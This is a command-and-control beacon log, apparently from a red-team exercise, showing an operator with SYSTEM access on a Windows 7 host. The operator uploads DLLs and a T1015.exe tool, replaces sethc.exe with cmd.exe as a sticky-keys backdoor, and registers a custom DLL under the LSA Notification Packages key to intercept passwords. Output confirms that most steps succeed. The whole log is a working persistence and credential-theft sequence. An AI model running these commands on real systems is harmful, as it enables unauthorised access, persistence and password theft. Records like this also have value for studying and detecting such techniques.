01/29 15:37:10 [metadata] 172.17.2.54 <- 172.17.2.54; computer: A-PC; user: SYSTEM *; pid: 856; os: Windows; version: 6.1; beacon arch: x86 (x64)
01/29 15:46:42 [task] Tasked beacon to make directory C:\Windows\System32\
01/29 15:46:42 [task] cd C:\Windows\System32\
01/29 15:46:42 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\vcruntime140d.dll as vcruntime140d.dll
01/29 15:46:42 [indicator] file: 4a550c268550d49abbaff02e4a1abf24 113488 bytes vcruntime140d.dll
01/29 15:46:42 [task] Tasked beacon to run: takeown /F "C:\Windows\System32\sethc.exe" /A
01/29 15:46:42 [task] Tasked beacon to run: icacls "C:\Windows\System32\sethc.exe" /grant Administrators:F
01/29 15:46:42 [task] Tasked beacon to run: copy C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
01/29 15:46:42 [task] Tasked beacon to make directory c:\RedTeam\
01/29 15:46:42 [task] cd c:\RedTeam\
01/29 15:46:42 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\T1015.exe as T1015.exe
01/29 15:46:42 [indicator] file: 2b1d5ac098b77384576cbef3e8e1be50 36864 bytes T1015.exe
01/29 15:46:42 [task] Tasked beacon to run: C:\ReadTeam\T1015.exe
01/29 15:47:06 [checkin] host called home, sent: 150810 bytes
01/29 15:47:07 [output]
received output:

成功: 此文件(或文件夹): "C:\Windows\System32\sethc.exe" 现在由管理员组所有。


01/29 15:47:07 [output]
received output:
已处理的文件: C:\Windows\System32\sethc.exe
已成功处理 1 个文件; 处理 0 个文件时失败


01/29 15:47:07 [output]
received output:
已复制         1 个文件。


01/29 15:47:07 [output]
received output:
系统找不到指定的路径。


01/29 15:49:44 [task] Tasked beacon to make directory C:\Windows\System32\
01/29 15:49:44 [task] cd C:\Windows\System32\
01/29 15:49:44 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\vcruntime140d.dll as vcruntime140d.dll
01/29 15:49:45 [indicator] file: 4a550c268550d49abbaff02e4a1abf24 113488 bytes vcruntime140d.dll
01/29 15:49:45 [task] Tasked beacon to run: takeown /F "C:\Windows\System32\sethc.exe" /A
01/29 15:49:45 [task] Tasked beacon to run: icacls "C:\Windows\System32\sethc.exe" /grant Administrators:F
01/29 15:49:45 [task] Tasked beacon to run: copy C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
01/29 15:49:45 [task] Tasked beacon to make directory c:\RedTeam\
01/29 15:49:45 [task] cd c:\RedTeam\
01/29 15:49:45 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\T1015.exe as T1015.exe
01/29 15:49:45 [indicator] file: 2b1d5ac098b77384576cbef3e8e1be50 36864 bytes T1015.exe
01/29 15:49:45 [task] Tasked beacon to run: C:\RedTeam\T1015.exe
01/29 15:50:07 [checkin] host called home, sent: 150809 bytes
01/29 15:50:07 [output]
received output:

成功: 此文件(或文件夹): "C:\Windows\System32\sethc.exe" 现在由管理员组所有。


01/29 15:50:07 [output]
received output:
已处理的文件: C:\Windows\System32\sethc.exe
已成功处理 1 个文件; 处理 0 个文件时失败


01/29 15:50:07 [output]
received output:
已复制         1 个文件。


01/29 15:59:27 [task] Tasked beacon to make directory C:\Windows\System32\
01/29 15:59:27 [task] cd C:\Windows\System32\
01/29 15:59:27 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\vcruntime140d.dll as vcruntime140d.dll
01/29 15:59:28 [indicator] file: 4a550c268550d49abbaff02e4a1abf24 113488 bytes vcruntime140d.dll
01/29 15:59:28 [task] Tasked beacon to make directory C:\Windows\System32\
01/29 15:59:28 [task] cd C:\Windows\System32\
01/29 15:59:33 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\ucrtbased.dll as ucrtbased.dll
01/29 15:59:33 [indicator] file: d2e30ccb8427870b1f8b3c2ecb6563bf 1647104 bytes ucrtbased.dll
01/29 15:59:33 [task] Tasked beacon to run: regsvr32 dll
01/29 15:59:33 [task] Tasked beacon to run: regsvr32 dll
01/29 15:59:33 [task] Tasked beacon to run: icacls "C:\Windows\System32\sethc.exe" /grant Administrators:F
01/29 15:59:33 [task] Tasked beacon to run: copy cmd.exe sethc.exe
01/29 15:59:33 [task] Tasked beacon to make directory c:\RedTeam\
01/29 15:59:33 [task] cd c:\RedTeam\
01/29 15:59:33 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\T1015.exe as T1015.exe
01/29 15:59:33 [indicator] file: 2b1d5ac098b77384576cbef3e8e1be50 36864 bytes T1015.exe
01/29 15:59:33 [task] Tasked beacon to run: C:\RedTeam\T1015.exe
01/29 16:00:07 [checkin] host called home, sent: 900086 bytes
01/29 16:00:22 [task] Tasked beacon to make directory C:\Windows\System32\
01/29 16:00:22 [task] cd C:\Windows\System32\
01/29 16:00:22 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\vcruntime140d.dll as vcruntime140d.dll
01/29 16:00:23 [indicator] file: 4a550c268550d49abbaff02e4a1abf24 113488 bytes vcruntime140d.dll
01/29 16:00:23 [task] Tasked beacon to make directory C:\Windows\System32\
01/29 16:00:23 [task] cd C:\Windows\System32\
01/29 16:00:27 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\ucrtbased.dll as ucrtbased.dll
01/29 16:00:28 [indicator] file: d2e30ccb8427870b1f8b3c2ecb6563bf 1647104 bytes ucrtbased.dll
01/29 16:00:28 [task] Tasked beacon to run: regsvr32 dll
01/29 16:00:28 [task] Tasked beacon to run: regsvr32 dll
01/29 16:00:28 [task] Tasked beacon to run: icacls "C:\Windows\System32\sethc.exe" /grant Administrators:F
01/29 16:00:28 [task] Tasked beacon to run: copy cmd.exe sethc.exe
01/29 16:00:28 [task] Tasked beacon to make directory c:\RedTeam\
01/29 16:00:28 [task] cd c:\RedTeam\
01/29 16:00:28 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\T1015.exe as T1015.exe
01/29 16:00:28 [indicator] file: 2b1d5ac098b77384576cbef3e8e1be50 36864 bytes T1015.exe
01/29 16:00:28 [task] Tasked beacon to run: C:\RedTeam\T1015.exe
01/29 16:01:07 [checkin] host called home, sent: 1011607 bytes
01/29 16:01:27 [output]
received output:
已处理的文件: C:\Windows\System32\sethc.exe
已成功处理 1 个文件; 处理 0 个文件时失败


01/29 16:01:27 [output]
received output:
已复制         1 个文件。


01/29 16:01:27 [output]
received output:

Windows IP 配置


以太网适配器 本地连接:

   连接特定的 DNS 后缀 . . . . . . . : 
   本地链接 IPv6 地址. . . . . . . . : fe80::dc70:1ea3:67b5:311%11
   IPv4 地址 . . . . . . . . . . . . : 172.17.2.54
   子网掩码  . . . . . . . . . . . . : 255.255.254.0
   默认网关. . . . . . . . . . . . . : 172.17.2.1

隧道适配器 isatap.{A8E7B51B-9069-45DB-BA99-054EA369046E}:

   媒体状态  . . . . . . . . . . . . : 媒体已断开
   连接特定的 DNS 后缀 . . . . . . . : 


01/29 16:02:27 [checkin] host called home, sent: 1046578 bytes
01/29 16:03:28 [checkin] host called home, sent: 637857 bytes
01/29 16:03:48 [output]
received output:
已处理的文件: C:\Windows\System32\sethc.exe
已成功处理 1 个文件; 处理 0 个文件时失败


01/29 16:03:48 [output]
received output:
已复制         1 个文件。


01/29 16:03:48 [output]
received output:

Windows IP 配置


以太网适配器 本地连接:

   连接特定的 DNS 后缀 . . . . . . . : 
   本地链接 IPv6 地址. . . . . . . . : fe80::dc70:1ea3:67b5:311%11
   IPv4 地址 . . . . . . . . . . . . : 172.17.2.54
   子网掩码  . . . . . . . . . . . . : 255.255.254.0
   默认网关. . . . . . . . . . . . . : 172.17.2.1

隧道适配器 isatap.{A8E7B51B-9069-45DB-BA99-054EA369046E}:

   媒体状态  . . . . . . . . . . . . : 媒体已断开
   连接特定的 DNS 后缀 . . . . . . . : 


01/29 16:15:12 [task] Tasked beacon to make directory C:\Windows\System32\
01/29 16:15:12 [task] cd C:\Windows\System32\
01/29 16:15:12 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\vcruntime140d.dll as vcruntime140d.dll
01/29 16:15:12 [indicator] file: 4a550c268550d49abbaff02e4a1abf24 113488 bytes vcruntime140d.dll
01/29 16:15:12 [task] Tasked beacon to make directory C:\Windows\System32\
01/29 16:15:13 [task] cd C:\Windows\System32\
01/29 16:15:17 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\ucrtbased.dll as ucrtbased.dll
01/29 16:15:18 [indicator] file: d2e30ccb8427870b1f8b3c2ecb6563bf 1647104 bytes ucrtbased.dll
01/29 16:15:18 [task] Tasked beacon to run: regsvr32 dll
01/29 16:15:18 [task] Tasked beacon to run: takeown /F "C:\Windows\System32\sethc.exe" /A
01/29 16:15:18 [task] Tasked beacon to run: icacls "C:\Windows\System32\sethc.exe" /grant Administrators:F
01/29 16:15:18 [task] Tasked beacon to run: copy cmd.exe sethc.exe
01/29 16:15:18 [task] Tasked beacon to make directory c:\RedTeam\
01/29 16:15:18 [task] cd c:\RedTeam\
01/29 16:15:18 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\T1015.exe as T1015.exe
01/29 16:15:18 [indicator] file: 2b1d5ac098b77384576cbef3e8e1be50 36864 bytes T1015.exe
01/29 16:15:18 [task] Tasked beacon to run: C:\RedTeam\T1015.exe
01/29 16:15:48 [checkin] host called home, sent: 900086 bytes
01/29 16:16:48 [checkin] host called home, sent: 898011 bytes
01/29 16:16:58 [output]
received output:

成功: 此文件(或文件夹): "C:\Windows\System32\sethc.exe" 现在由管理员组所有。


01/29 16:16:58 [output]
received output:
已处理的文件: C:\Windows\System32\sethc.exe
已成功处理 1 个文件; 处理 0 个文件时失败


01/29 16:16:58 [output]
received output:
已复制         1 个文件。


01/29 16:16:58 [output]
received output:

Windows IP 配置


以太网适配器 本地连接:

   连接特定的 DNS 后缀 . . . . . . . : 
   本地链接 IPv6 地址. . . . . . . . : fe80::dc70:1ea3:67b5:311%11
   IPv4 地址 . . . . . . . . . . . . : 172.17.2.54
   子网掩码  . . . . . . . . . . . . : 255.255.254.0
   默认网关. . . . . . . . . . . . . : 172.17.2.1

隧道适配器 isatap.{A8E7B51B-9069-45DB-BA99-054EA369046E}:

   媒体状态  . . . . . . . . . . . . : 媒体已断开
   连接特定的 DNS 后缀 . . . . . . . : 


01/29 16:19:42 [task] Tasked beacon to make directory C:\Windows\System32\
01/29 16:19:42 [task] cd C:\Windows\System32\
01/29 16:19:43 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\vcruntime140d.dll as vcruntime140d.dll
01/29 16:19:43 [indicator] file: 4a550c268550d49abbaff02e4a1abf24 113488 bytes vcruntime140d.dll
01/29 16:19:43 [task] Tasked beacon to make directory C:\Windows\System32\
01/29 16:19:43 [task] cd C:\Windows\System32\
01/29 16:19:48 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\ucrtbased.dll as ucrtbased.dll
01/29 16:19:48 [indicator] file: d2e30ccb8427870b1f8b3c2ecb6563bf 1647104 bytes ucrtbased.dll
01/29 16:19:48 [task] Tasked beacon to run: regsvr32 vcruntime140d.dll
01/29 16:19:48 [task] Tasked beacon to run: regsvr32 ucrtbased.dll
01/29 16:19:48 [task] Tasked beacon to run: takeown /F "C:\Windows\System32\sethc.exe" /A
01/29 16:19:48 [task] Tasked beacon to run: icacls "C:\Windows\System32\sethc.exe" /grant Administrators:F
01/29 16:19:48 [task] Tasked beacon to run: copy cmd.exe sethc.exe
01/29 16:19:48 [task] Tasked beacon to make directory c:\RedTeam\
01/29 16:19:48 [task] cd c:\RedTeam\
01/29 16:19:48 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\T1015.exe as T1015.exe
01/29 16:19:48 [indicator] file: 2b1d5ac098b77384576cbef3e8e1be50 36864 bytes T1015.exe
01/29 16:19:48 [task] Tasked beacon to run: C:\RedTeam\T1015.exe
01/29 16:19:58 [checkin] host called home, sent: 900086 bytes
01/29 16:20:58 [checkin] host called home, sent: 898078 bytes
01/29 16:21:19 [output]
received output:

成功: 此文件(或文件夹): "C:\Windows\System32\sethc.exe" 现在由管理员组所有。


01/29 16:21:19 [output]
received output:
已处理的文件: C:\Windows\System32\sethc.exe
已成功处理 1 个文件; 处理 0 个文件时失败


01/29 16:21:19 [output]
received output:
已复制         1 个文件。


01/29 16:21:19 [output]
received output:

Windows IP 配置


以太网适配器 本地连接:

   连接特定的 DNS 后缀 . . . . . . . : 
   本地链接 IPv6 地址. . . . . . . . : fe80::dc70:1ea3:67b5:311%11
   IPv4 地址 . . . . . . . . . . . . : 172.17.2.54
   子网掩码  . . . . . . . . . . . . : 255.255.254.0
   默认网关. . . . . . . . . . . . . : 172.17.2.1

隧道适配器 isatap.{A8E7B51B-9069-45DB-BA99-054EA369046E}:

   媒体状态  . . . . . . . . . . . . : 媒体已断开
   连接特定的 DNS 后缀 . . . . . . . : 


01/29 16:33:30 [metadata] 172.17.2.54 <- 172.17.2.54; computer: A-PC; user: SYSTEM *; pid: 856; os: Windows; version: 6.1; beacon arch: x86 (x64)
01/29 16:33:53 [task] Tasked beacon to run: REG QUERY "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Notification Packages"
01/29 16:33:53 [task] Tasked beacon to run: REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Notification Packages" /t REG_MULTI_SZ /d "scecli\0Win32Project3" /f
01/29 16:34:29 [checkin] host called home, sent: 266 bytes
01/29 16:34:30 [output]
received output:
Traceback (most recent call last):
  File "C:\Python37\Scripts\reg.py", line 4, in <module>
    __import__('pkg_resources').run_script('impacket==0.9.23.dev1+20210108.113210.1dec03a4', 'reg.py')
  File "C:\Python37\lib\site-packages\pkg_resources\__init__.py", line 3017, in <module>
    @_call_aside
  File "C:\Python37\lib\site-packages\pkg_resources\__init__.py", line 3003, in _call_aside
    f(*args, **kwargs)
  File "C:\Python37\lib\site-packages\pkg_resources\__init__.py", line 3030, in _initialize_master_working_set
    working_set = WorkingSet._build_master()
  File "C:\Python37\lib\site-packages\pkg_resources\__init__.py", line 659, in _build_master
    ws.require(__requires__)
  File "C:\Python37\lib\site-packages\pkg_resources\__init__.py", line 967, in require
    needed = self.resolve(parse_requirements(requirements))
  File "C:\Python37\lib\site-packages\pkg_resources\__init__.py", line 853, in resolve
    raise DistributionNotFound(req, requirers)
pkg_resources.DistributionNotFound: The 'pyOpenSSL>=0.13.1' distribution was not found and is required by impacket


01/29 16:34:30 [output]
received output:
Traceback (most recent call last):
  File "C:\Python37\Scripts\reg.py", line 4, in <module>
    __import__('pkg_resources').run_script('impacket==0.9.23.dev1+20210108.113210.1dec03a4', 'reg.py')
  File "C:\Python37\lib\site-packages\pkg_resources\__init__.py", line 3017, in <module>
    @_call_aside
  File "C:\Python37\lib\site-packages\pkg_resources\__init__.py", line 3003, in _call_aside
    f(*args, **kwargs)
  File "C:\Python37\lib\site-packages\pkg_resources\__init__.py", line 3030, in _initialize_master_working_set
    working_set = WorkingSet._build_master()
  File "C:\Python37\lib\site-packages\pkg_resources\__init__.py", line 659, in _build_master
    ws.require(__requires__)
  File "C:\Python37\lib\site-packages\pkg_resources\__init__.py", line 967, in require
    needed = self.resolve(parse_requirements(requirements))
  File "C:\Python37\lib\site-packages\pkg_resources\__init__.py", line 853, in resolve
    raise DistributionNotFound(req, requirers)
pkg_resources.DistributionNotFound: The 'pyOpenSSL>=0.13.1' distribution was not found and is required by impacket


01/29 17:02:27 [task] cd c:\Windows\System32
01/29 17:02:27 [task] Tasked beacon to run: REG QUERY "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Notification Packages"
01/29 17:02:27 [task] Tasked beacon to run: REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Notification Packages" /t REG_MULTI_SZ /d "scecli\0Win32Project3" /f
01/29 17:02:30 [checkin] host called home, sent: 293 bytes
01/29 17:02:30 [output]
received output:

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa
    Notification Packages    REG_MULTI_SZ    scecli



01/29 17:02:30 [output]
received output:
操作成功完成。


01/29 17:11:55 [task] cd c:\Windows\System32
01/29 17:11:55 [task] Tasked beacon to run: REG QUERY "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Notification Packages"
01/29 17:11:55 [task] Tasked beacon to run: REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Notification Packages" /t REG_MULTI_SZ /d "scecli\0aisakeng" /f
01/29 17:12:30 [checkin] host called home, sent: 288 bytes
01/29 17:12:30 [output]
received output:

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa
    Notification Packages    REG_MULTI_SZ    scecli\0Win32Project3



01/29 17:12:30 [output]
received output:
操作成功完成。


